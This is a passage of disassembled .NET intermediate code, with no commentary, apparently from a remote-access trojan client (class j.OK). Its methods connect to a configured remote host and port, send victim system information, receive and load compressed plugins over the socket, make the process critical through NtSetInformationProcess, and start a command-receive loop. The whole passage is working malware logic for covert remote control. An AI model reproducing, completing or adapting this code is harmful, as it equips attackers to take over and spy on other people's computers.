      IL_0a5e:  ldc.i4.0
      IL_0a5f:  ceq
      IL_0a61:  ldloc.s    V_32
      IL_0a63:  ldc.i4.s   20
      IL_0a65:  ceq
      IL_0a67:  or
      IL_0a68:  ldsfld     bool j.OK::Cn
      IL_0a6d:  ldc.i4.0
      IL_0a6e:  ceq
      IL_0a70:  or
      IL_0a71:  brfalse.s  IL_0a46

      IL_0a73:  ldsfld     object j.OK::PLG
      IL_0a78:  ldnull
      IL_0a79:  ceq
      IL_0a7b:  ldsfld     bool j.OK::Cn
      IL_0a80:  ldc.i4.0
      IL_0a81:  ceq
      IL_0a83:  or
      IL_0a84:  brfalse.s  IL_0a8b

      IL_0a86:  leave      IL_0c53

      IL_0a8b:  ldsfld     object j.OK::PLG
      IL_0a90:  ldnull
      IL_0a91:  ldstr      "ind"
      IL_0a96:  ldc.i4.1
      IL_0a97:  newarr     [mscorlib]System.Object
      IL_0a9c:  stloc.s    V_40
      IL_0a9e:  ldloc.s    V_40
      IL_0aa0:  ldc.i4.0
      IL_0aa1:  ldarg.0
      IL_0aa2:  stelem.ref
      IL_0aa3:  ldloc.s    V_40
      IL_0aa5:  stloc.s    V_51
      IL_0aa7:  ldloc.s    V_51
      IL_0aa9:  ldnull
      IL_0aaa:  ldnull
      IL_0aab:  ldc.i4.1
      IL_0aac:  newarr     [mscorlib]System.Boolean
      IL_0ab1:  stloc.s    V_52
      IL_0ab3:  ldloc.s    V_52
      IL_0ab5:  ldc.i4.0
      IL_0ab6:  ldc.i4.1
      IL_0ab7:  stelem.i1
      IL_0ab8:  ldloc.s    V_52
      IL_0aba:  ldc.i4.1
      IL_0abb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0ac0:  pop
      IL_0ac1:  ldloc.s    V_52
      IL_0ac3:  ldc.i4.0
      IL_0ac4:  ldelem.i1
      IL_0ac5:  brfalse    IL_0bbb

      IL_0aca:  ldloc.s    V_51
      IL_0acc:  ldc.i4.0
      IL_0acd:  ldelem.ref
      IL_0ace:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ad3:  ldtoken    uint8[]
      IL_0ad8:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0add:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0ae2:  castclass  uint8[]
      IL_0ae7:  starg.s    b
      IL_0ae9:  leave      IL_0c53

      IL_0aee:  ldloc.s    V_37
      IL_0af0:  ldstr      "PLG"
      IL_0af5:  ldc.i4.0
      IL_0af6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0afb:  ldc.i4.0
      IL_0afc:  bne.un     IL_0bbb

      IL_0b01:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0b06:  stloc.s    V_34
      IL_0b08:  ldloc.0
      IL_0b09:  ldc.i4.0
      IL_0b0a:  ldelem.ref
      IL_0b0b:  ldsfld     string j.OK::Y
      IL_0b10:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0b15:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0b1a:  stloc.s    V_33
      IL_0b1c:  ldloc.s    V_34
      IL_0b1e:  ldarg.0
      IL_0b1f:  ldloc.s    V_33
      IL_0b21:  ldarg.0
      IL_0b22:  ldlen
      IL_0b23:  conv.ovf.i4
      IL_0b24:  ldloc.s    V_33
      IL_0b26:  sub.ovf
      IL_0b27:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0b2c:  ldloc.s    V_34
      IL_0b2e:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0b33:  call       uint8[] j.OK::ZIP(uint8[])
      IL_0b38:  ldstr      "A"
      IL_0b3d:  call       object j.OK::Plugin(uint8[],
                                                           string)
      IL_0b42:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0b47:  stsfld     object j.OK::PLG
      IL_0b4c:  ldsfld     object j.OK::PLG
      IL_0b51:  ldnull
      IL_0b52:  ldstr      "H"
      IL_0b57:  ldc.i4.1
      IL_0b58:  newarr     [mscorlib]System.Object
      IL_0b5d:  stloc.s    V_51
      IL_0b5f:  ldloc.s    V_51
      IL_0b61:  ldc.i4.0
      IL_0b62:  ldsfld     string j.OK::H
      IL_0b67:  stelem.ref
      IL_0b68:  ldloc.s    V_51
      IL_0b6a:  ldnull
      IL_0b6b:  ldnull
      IL_0b6c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0b71:  ldsfld     object j.OK::PLG
      IL_0b76:  ldnull
      IL_0b77:  ldstr      "P"
      IL_0b7c:  ldc.i4.1
      IL_0b7d:  newarr     [mscorlib]System.Object
      IL_0b82:  stloc.s    V_51
      IL_0b84:  ldloc.s    V_51
      IL_0b86:  ldc.i4.0
      IL_0b87:  ldsfld     string j.OK::P
      IL_0b8c:  stelem.ref
      IL_0b8d:  ldloc.s    V_51
      IL_0b8f:  ldnull
      IL_0b90:  ldnull
      IL_0b91:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0b96:  ldsfld     object j.OK::PLG
      IL_0b9b:  ldnull
      IL_0b9c:  ldstr      "c"
      IL_0ba1:  ldc.i4.1
      IL_0ba2:  newarr     [mscorlib]System.Object
      IL_0ba7:  stloc.s    V_51
      IL_0ba9:  ldloc.s    V_51
      IL_0bab:  ldc.i4.0
      IL_0bac:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0bb1:  stelem.ref
      IL_0bb2:  ldloc.s    V_51
      IL_0bb4:  ldnull
      IL_0bb5:  ldnull
      IL_0bb6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0bbb:  leave      IL_0c53

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0bc0:  dup
      IL_0bc1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0bc6:  stloc.s    V_35
      IL_0bc8:  ldloc.0
      IL_0bc9:  ldlen
      IL_0bca:  conv.ovf.i4
      IL_0bcb:  ldc.i4.0
      IL_0bcc:  ble.s      IL_0bf9

      IL_0bce:  ldloc.0
      IL_0bcf:  ldc.i4.0
      IL_0bd0:  ldelem.ref
      IL_0bd1:  ldstr      "Ex"
      IL_0bd6:  ldc.i4.0
      IL_0bd7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bdc:  ldc.i4.0
      IL_0bdd:  ceq
      IL_0bdf:  ldloc.0
      IL_0be0:  ldc.i4.0
      IL_0be1:  ldelem.ref
      IL_0be2:  ldstr      "PLG"
      IL_0be7:  ldc.i4.0
      IL_0be8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bed:  ldc.i4.0
      IL_0bee:  ceq
      IL_0bf0:  or
      IL_0bf1:  brfalse.s  IL_0bf9

      IL_0bf3:  ldnull
      IL_0bf4:  stsfld     object j.OK::PLG
      .try
      {
        IL_0bf9:  ldc.i4.5
        IL_0bfa:  newarr     [mscorlib]System.String
        IL_0bff:  stloc.s    V_39
        IL_0c01:  ldloc.s    V_39
        IL_0c03:  ldc.i4.0
        IL_0c04:  ldstr      "ER"
        IL_0c09:  stelem.ref
        IL_0c0a:  ldloc.s    V_39
        IL_0c0c:  ldc.i4.1
        IL_0c0d:  ldsfld     string j.OK::Y
        IL_0c12:  stelem.ref
        IL_0c13:  ldloc.s    V_39
        IL_0c15:  ldc.i4.2
        IL_0c16:  ldloc.0
        IL_0c17:  ldc.i4.0
        IL_0c18:  ldelem.ref
        IL_0c19:  stelem.ref
        IL_0c1a:  ldloc.s    V_39
        IL_0c1c:  ldc.i4.3
        IL_0c1d:  ldsfld     string j.OK::Y
        IL_0c22:  stelem.ref
        IL_0c23:  ldloc.s    V_39
        IL_0c25:  ldc.i4.4
        IL_0c26:  ldloc.s    V_35
        IL_0c28:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0c2d:  stelem.ref
        IL_0c2e:  ldloc.s    V_39
        IL_0c30:  call       string [mscorlib]System.String::Concat(string[])
        IL_0c35:  call       bool j.OK::Send(string)
        IL_0c3a:  pop
        IL_0c3b:  leave.s    IL_0c4c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0c3d:  dup
        IL_0c3e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0c43:  stloc.s    V_36
        IL_0c45:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0c4a:  leave.s    IL_0c4c

      }  // end handler
      IL_0c4c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0c51:  leave.s    IL_0c53

    }  // end handler
    IL_0c53:  ret
  } // end of method OK::Ind

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       70 (0x46)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider V_1,
             string V_2,
             uint8 V_3,
             int32 V_4,
             uint8[] V_5)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  stloc.1
    IL_0006:  ldloc.1
    IL_0007:  ldarg.0
    IL_0008:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000d:  starg.s    B
    IL_000f:  ldstr      ""
    IL_0014:  stloc.2
    IL_0015:  ldarg.0
    IL_0016:  stloc.s    V_5
    IL_0018:  ldc.i4.0
    IL_0019:  stloc.s    V_4
    IL_001b:  br.s       IL_003c

    IL_001d:  ldloc.s    V_5
    IL_001f:  ldloc.s    V_4
    IL_0021:  ldelem.u1
    IL_0022:  stloc.3
    IL_0023:  ldloc.2
    IL_0024:  ldloca.s   V_3
    IL_0026:  ldstr      "x2"
    IL_002b:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_0030:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0035:  stloc.2
    IL_0036:  ldloc.s    V_4
    IL_0038:  ldc.i4.1
    IL_0039:  add.ovf
    IL_003a:  stloc.s    V_4
    IL_003c:  ldloc.s    V_4
    IL_003e:  ldloc.s    V_5
    IL_0040:  ldlen
    IL_0041:  conv.ovf.i4
    IL_0042:  blt.s      IL_001d

    IL_0044:  ldloc.2
    IL_0045:  ret
  } // end of method OK::md5

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       38 (0x26)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                                           int32,
                                                                           int32&,
                                                                           int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0025

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0023:  leave.s    IL_0025

    }  // end handler
    IL_0025:  ret
  } // end of method OK::pr

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       202 (0xca)
    .maxstack  5
    .locals init (bool V_0,
             uint8[] V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.IO.FileInfo V_5,
             int32 V_6,
             string V_7)
    IL_0000:  ldsfld     bool j.OK::Cn
    IL_0005:  brtrue.s   IL_0009

    IL_0007:  ldc.i4.0
    IL_0008:  ret

    .try
    {
      IL_0009:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_000e:  stloc.s    V_5
      IL_0010:  ldloc.s    V_5
      IL_0012:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_0017:  ldsfld     bool j.OK::Cn
        IL_001c:  brtrue.s   IL_0025

        IL_001e:  ldc.i4.0
        IL_001f:  stloc.0
        IL_0020:  leave      IL_00c8

        IL_0025:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002a:  stloc.2
        IL_002b:  ldarg.0
        IL_002c:  ldlen
        IL_002d:  conv.ovf.i4
        IL_002e:  stloc.s    V_6
        IL_0030:  ldloca.s   V_6
        IL_0032:  call       instance string [mscorlib]System.Int32::ToString()
        IL_0037:  ldstr      bytearray (00 00 ) 
        IL_003c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0041:  stloc.s    V_7
        IL_0043:  ldloca.s   V_7
        IL_0045:  call       uint8[] j.OK::SB(string&)
        IL_004a:  stloc.1
        IL_004b:  ldloc.2
        IL_004c:  ldloc.1
        IL_004d:  ldc.i4.0
        IL_004e:  ldloc.1
        IL_004f:  ldlen
        IL_0050:  conv.ovf.i4
        IL_0051:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0056:  ldloc.2
        IL_0057:  ldarg.0
        IL_0058:  ldc.i4.0
        IL_0059:  ldarg.0
        IL_005a:  ldlen
        IL_005b:  conv.ovf.i4
        IL_005c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0061:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0066:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_006b:  ldloc.2
        IL_006c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0071:  ldc.i4.0
        IL_0072:  ldloc.2
        IL_0073:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_0078:  conv.ovf.i4
        IL_0079:  ldc.i4.0
        IL_007a:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_007f:  pop
        IL_0080:  leave.s    IL_00c2

      }  // end .try
      finally
      {
        IL_0082:  ldloc.s    V_5
        IL_0084:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_0089:  endfinally
      }  // end handler
      IL_008a:  leave.s    IL_00c2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_008c:  dup
      IL_008d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0092:  stloc.3
      .try
      {
        IL_0093:  ldsfld     bool j.OK::Cn
        IL_0098:  brfalse.s  IL_00aa

        IL_009a:  ldc.i4.0
        IL_009b:  stsfld     bool j.OK::Cn
        IL_00a0:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00a5:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00aa:  leave.s    IL_00bb

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00ac:  dup
        IL_00ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00b2:  stloc.s    V_4
        IL_00b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b9:  leave.s    IL_00bb

      }  // end handler
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c0:  leave.s    IL_00c2

    }  // end handler
    IL_00c2:  ldsfld     bool j.OK::Cn
    IL_00c7:  ret

    IL_00c8:  ldloc.0
    IL_00c9:  ret
  } // end of method OK::Sendb

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  1
    .locals init (bool V_0)
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       bool j.OK::Sendb(uint8[])
    IL_000c:  ret
  } // end of method OK::Send

  .method public static bool  connect() cil managed
  {
    // Code size       606 (0x25e)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             string V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.IO.FileInfo V_7,
             string V_8,
             string[] V_9)
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     bool j.OK::Cn
    IL_0006:  ldc.i4     0x7d0
    IL_000b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0010:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0015:  stloc.s    V_7
    IL_0017:  ldloc.s    V_7
    IL_0019:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_001e:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0023:  brfalse.s  IL_0045

        .try
        {
          IL_0025:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_002a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_002f:  ldnull
          IL_0030:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0035:  leave.s    IL_0045

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0037:  dup
          IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_003d:  stloc.1
          IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0043:  leave.s    IL_0045

        }  // end handler
        .try
        {
          IL_0045:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_004a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_004f:  leave.s    IL_006d

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0051:  dup
          IL_0052:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0057:  stloc.2
          IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_005d:  leave.s    IL_006d

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_005f:  dup
        IL_0060:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0065:  stloc.3
        IL_0066:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_006b:  leave.s    IL_006d

      }  // end handler
      .try
      {
        IL_006d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0072:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
        IL_0077:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_007c:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0081:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0086:  ldc.i4     0x32000
        IL_008b:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
        IL_0090:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0095:  ldc.i4     0x32000
        IL_009a:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
        IL_009f:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00a4:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00a9:  ldc.i4     0x2710
        IL_00ae:  callvirt   instance void [System]System.Net.Sockets.Socket::set_SendTimeout(int32)
        IL_00b3:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b8:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_00bd:  ldc.i4     0x2710
        IL_00c2:  callvirt   instance void [System]System.Net.Sockets.Socket::set_ReceiveTimeout(int32)
        IL_00c7:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00cc:  ldsfld     string j.OK::H
        IL_00d1:  ldsfld     string j.OK::P
        IL_00d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_00db:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_00e0:  ldc.i4.1
        IL_00e1:  stsfld     bool j.OK::Cn
        IL_00e6:  call       string j.OK::inf()
        IL_00eb:  call       bool j.OK::Send(string)
        IL_00f0:  pop
        .try
        {
          IL_00f1:  ldstr      "vn"
          IL_00f6:  ldstr      ""
          IL_00fb:  call       object j.OK::GTV(string,
                                                            object)
          IL_0100:  ldstr      ""
          IL_0105:  ldc.i4.0
          IL_0106:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                           object,
                                                                                                                                           bool)
          IL_010b:  brfalse.s  IL_0127

          IL_010d:  ldloc.s    V_4
          IL_010f:  ldsflda    string j.OK::VN
          IL_0114:  call       string j.OK::DEB(string&)
          IL_0119:  ldstr      "\r\n"
          IL_011e:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0123:  stloc.s    V_4
          IL_0125:  br.s       IL_0152

          IL_0127:  ldloc.s    V_4
          IL_0129:  ldstr      "vn"
          IL_012e:  ldstr      ""
          IL_0133:  call       object j.OK::GTV(string,
                                                            object)
          IL_0138:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
          IL_013d:  stloc.s    V_8
          IL_013f:  ldloca.s   V_8
          IL_0141:  call       string j.OK::DEB(string&)
          IL_0146:  ldstr      "\r\n"
          IL_014b:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0150:  stloc.s    V_4
          IL_0152:  ldc.i4.5
          IL_0153:  newarr     [mscorlib]System.String
          IL_0158:  stloc.s    V_9
          IL_015a:  ldloc.s    V_9
          IL_015c:  ldc.i4.0
          IL_015d:  ldloc.s    V_4
          IL_015f:  stelem.ref
          IL_0160:  ldloc.s    V_9
          IL_0162:  ldc.i4.1
          IL_0163:  ldsfld     string j.OK::H
          IL_0168:  stelem.ref
          IL_0169:  ldloc.s    V_9
          IL_016b:  ldc.i4.2
          IL_016c:  ldstr      ":"
          IL_0171:  stelem.ref
          IL_0172:  ldloc.s    V_9
          IL_0174:  ldc.i4.3
          IL_0175:  ldsfld     string j.OK::P
          IL_017a:  stelem.ref
          IL_017b:  ldloc.s    V_9
          IL_017d:  ldc.i4.4
          IL_017e:  ldstr      "\r\n"
          IL_0183:  stelem.ref
          IL_0184:  ldloc.s    V_9
          IL_0186:  call       string [mscorlib]System.String::Concat(string[])
          IL_018b:  stloc.s    V_4
          IL_018d:  ldloc.s    V_4
          IL_018f:  ldsfld     string j.OK::DR
          IL_0194:  ldstr      "\r\n"
          IL_0199:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_019e:  stloc.s    V_4
          IL_01a0:  ldloc.s    V_4
          IL_01a2:  ldsfld     string j.OK::EXE
          IL_01a7:  ldstr      "\r\n"
          IL_01ac:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01b1:  stloc.s    V_4
          IL_01b3:  ldloc.s    V_4
          IL_01b5:  ldsfld     bool j.OK::Idr
          IL_01ba:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01bf:  ldstr      "\r\n"
          IL_01c4:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01c9:  stloc.s    V_4
          IL_01cb:  ldloc.s    V_4
          IL_01cd:  ldsfld     bool j.OK::IsF
          IL_01d2:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01d7:  ldstr      "\r\n"
          IL_01dc:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01e1:  stloc.s    V_4
          IL_01e3:  ldloc.s    V_4
          IL_01e5:  ldsfld     bool j.OK::Isu
          IL_01ea:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_01ef:  ldstr      "\r\n"
          IL_01f4:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_01f9:  stloc.s    V_4
          IL_01fb:  ldloc.s    V_4
          IL_01fd:  ldsfld     bool j.OK::BD
          IL_0202:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
          IL_0207:  call       string [mscorlib]System.String::Concat(string,
                                                                      string)
          IL_020c:  stloc.s    V_4
          IL_020e:  ldstr      "inf"
          IL_0213:  ldsfld     string j.OK::Y
          IL_0218:  ldloca.s   V_4
          IL_021a:  call       string j.OK::ENB(string&)
          IL_021f:  call       string [mscorlib]System.String::Concat(string,
                                                                      string,
                                                                      string)
          IL_0224:  call       bool j.OK::Send(string)
          IL_0229:  pop
          IL_022a:  leave.s    IL_0258

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_022c:  dup
          IL_022d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0232:  stloc.s    V_5
          IL_0234:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0239:  leave.s    IL_0258

        }  // end handler
      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_023b:  dup
        IL_023c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0241:  stloc.s    V_6
        IL_0243:  ldc.i4.0
        IL_0244:  stsfld     bool j.OK::Cn
        IL_0249:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_024e:  leave.s    IL_0258

      }  // end handler
    }  // end .try
    finally
    {
      IL_0250:  ldloc.s    V_7
      IL_0252:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_0257:  endfinally
    }  // end handler
    IL_0258:  ldsfld     bool j.OK::Cn
    IL_025d:  ret
  } // end of method OK::connect

  .method public static void  RC() cil managed
  {
    // Code size       533 (0x215)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int32 V_2,
             string V_3,
             int32 V_4,
             int64 V_5,
             class [mscorlib]System.Threading.Thread V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             char V_9)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string j.OK::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_000f:  brtrue.s   IL_0016

    IL_0011:  br         IL_01c1

    IL_0016:  ldc.i4.m1
    IL_0017:  conv.i8
    IL_0018:  stloc.0
    IL_0019:  ldc.i4.0
    IL_001a:  stloc.1
    .try
    {
      IL_001b:  ldloc.1
      IL_001c:  ldc.i4.1
      IL_001d:  add.ovf
      IL_001e:  stloc.1
      IL_001f:  ldloc.1
      IL_0020:  ldc.i4.s   10
      IL_0022:  bne.un.s   IL_002c

      IL_0024:  ldc.i4.0
      IL_0025:  stloc.1
      IL_0026:  ldc.i4.1
      IL_0027:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002c:  ldsfld     bool j.OK::Cn
      IL_0031:  brtrue.s   IL_0038

